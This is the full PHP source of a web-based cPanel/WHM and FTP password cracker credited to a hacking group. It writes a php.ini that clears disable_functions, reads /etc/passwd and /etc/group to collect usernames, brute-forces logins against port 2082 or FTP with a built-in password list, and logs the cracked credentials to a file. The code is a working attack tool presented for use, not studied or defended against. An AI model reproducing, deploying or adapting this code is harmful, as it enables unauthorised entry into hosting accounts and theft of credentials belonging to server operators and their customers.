<?php


$head = '
<html>
<head>
</script>
<title>--==[[RR CPanel/WHM cracker by Team InidiShell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT: Black 1px solid;
BORDER-TOP: #DF0000 1px solid;
BORDER-LEFT: #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
document.getElementById(id).style.display = \'none\';
document.cookie=id+\'=0;\';
}
function show_div(id)
{
document.getElementById(id).style.display = \'block\';
document.cookie=id+\'=1;\';
}
function change_divst(id)
{
if (document.getElementById(id).style.display == \'none\')
show_div(id);
else
hide_div(id);
}
</script>'; ?>
<html>
<head>
<?php
echo $head ;
echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >



<td width="100%" align=center valign="top" rowspan="1"><font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ RR ]]==--</font><br>
<font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ cpanel/whm</font><font color=white size=5 face="comic sans ms"><b> Cracker By</font><font color=green size=5 face="comic sans ms"><b> Team IndiShell ]]==--</font> <div class="hedr">

<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
<font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br><font color=#ff9933> Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell,cool toad,cool shavik<br>Ebin V Thomas,Dinelson Amine,Th3 D3str0yer,SKSking,Mr. Trojan,rad paul,Godzila,mike waals,zoozoo,cyber warrior,Neo hacker ICA, Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,silent hacker,lovetherisk<br>Suriya Prakash,cyber gladiator,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Mannu, ViKi ,Budhaoo, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand and rest of TEAM INDISHELL<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># My Father and my Ex Teacher #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font><br><font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>

</table>
</table> <div align=center><font color=#ff9933 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="30" width="70%"><span class="footerlink">love happen only once.....Rest is life......</span></marquee><br></font></div><div align=center><table width=50%><font color=#ff9933 font size=5>--==[[ Code for India,Hack for India,Die for India ]]==--</font></table>

';

?></head>

<div align=center>

<a href=<?php echo '?ini';?>><font size=3 color=white face="comic sans ms"><b><u>php.ini</u></b></a>
<br>
<?php
    if(isset($_GET['ini']))
	{
		$r=fopen('php.ini','w');
		$content="disable_functions=none";
		fwrite($r,$content);
		echo "<a href=php.ini><font size=3 color=white face=\"comic sans ms\"><b><u>link to php.ini</u></b></a>";
		}
	
	?>	
<form method=post><font color=red size=3 face="comic sans ms">username extractor<br>
	<input type=submit name=passx value="cat /etc/passwd">&nbsp<input type=submit name=passb value="/etc/passwd bypasser">
	</form><p>
	<?php
if(isset($_POST['passb']))
{
	
	?>
<textarea style="background:black;color:white" rows=20 cols=25 name=usernames  ><?php  $users=file("/etc/group");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea>
<?php 
	
	}

?>	
<form method=post>
	<font color=white size=2 face="comic sans ms">
	website/ip address:<input type=text name=target value="localhost">
	Port:<input type=text name=port value=2082>
	</form><p><table width=30%><td align=center>user list</td><td align=center>passwords</td></table>
				<?php      
if(isset($_POST['passx']))
{
	?>
<textarea style="background:black;color:white" rows=20 cols=25 name=usernames  ><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea>
<?php 
}

else{
	?>
	<textarea style="background:black;color:white" rows=20 cols=25 name=usernames ></textarea>
	
<?php	}
?>&nbsp<textarea style="background:black;color:white" rows=20 cols=25 name=passwords><?php echo "pakistan\npak123\npak12345\npakistan786\npak786\n786\n786786\npak123456\npak1234\nallah786\nallahu\nallahisgreat\npakistani\npak4ever\nallah\nallah123\nallah1234\nallah12345\nallah123456\nallah911\npakbest\nadmin786\nadmin@786\nsql@786\nPakistan\nPak\nPakistan123\nPakistan1234\nPakistan786\nPak786";?></textarea><br><br>
name of the file in which you want to store cracked  panel info==> <input type=text name=crack value=crack.txt>
<p><input type=submit name=cracking value="lets hex this shit XD" /></form></p><br>
<?php
error_reporting(0);
set_time_limit(0);
$connect_timeout=5;

function any($prtcl,$host,$user,$pass,$timeout,$cracked,$aport){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$prtcl://$host:$aport");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b><font color=white size=2>=======================</font><font color=red size=2> $user </font><font color=white size=2>cracked with </font><font color=red size=2> $pass </font> <font color=white size=2>=======================</font></b></td></tr></table>";

$x=$user." ".$pass ." \n" ;
$y=@fopen($cracked,'a+');
@fwrite($y,$x);

}
curl_close($ch);

}

function Rsl($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{
		return substr($host,0,strrpos($host, '/', -1));
		}
	else{
		return $host;
		}
}

$userl=$_POST['usernames'];
$passl=$_POST['passwords'];
$port=trim($_POST['port']);
$crack=$_POST['crack'];
if(isset($_POST['cracking']))
{
	$target = trim($_POST['target']);
    $tarhr=ereg_replace("(https?)://", "", $target);
    $tarwr=ereg_replace("www.", "", $tarhr);
	$ftar=rsl($tarwr);
	
	$userlist=explode("\n",$userl);
    $passlist=explode("\n",$passl);
	if($port!=21)
	{
		$protocol="http";
		foreach ($userlist as $user) {
echo "<table width=80% ><tr><td align=center><b><font color=white size=2>user under attack is $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);

any($protocol,$target,$finaluser,$finalpass,$connect_timeout,$crack,$port);
}
}
		
		}
		else{
			$protocol="ftp";
		foreach ($userlist as $user) {
echo "<table width=80% ><tr><td align=center><b><font color=white size=2>user under attack is $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);

any($protocol,$target,$finaluser,$finalpass,$connect_timeout,$crack,$port);
}
}
			
			
			}
	
	
	}





?>
